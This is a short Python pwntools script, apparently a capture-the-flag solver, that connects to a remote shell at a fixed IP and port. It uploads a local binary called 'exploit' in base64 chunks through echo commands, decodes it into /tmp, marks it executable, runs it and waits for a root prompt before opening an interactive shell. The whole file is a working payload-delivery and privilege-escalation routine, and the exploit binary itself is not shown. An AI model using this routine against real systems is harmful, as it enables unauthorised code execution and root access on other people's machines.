#!/usr/bin/python3
from pwn import remote, context, base64

context.newline = b"\r\n"

shell = remote("94.237.63.201", 55691)

with open("./exploit", "rb") as file:
    payload = base64.b64encode(file.read()).decode()

for i in range(0, len(payload), 512):
    shell.sendlineafter(b"$ ", f'echo "{payload[i:i+512]}" >> /tmp/payload'.encode())

shell.sendlineafter(b"$ ", b"base64 -d /tmp/payload > /tmp/exploit")
shell.sendlineafter(b"$ ", b"rm /tmp/payload; chmod +x /tmp/exploit")
shell.sendlineafter(b"$ ", b"/tmp/exploit")

shell.recvline_contains(b"# ")
shell.interactive()
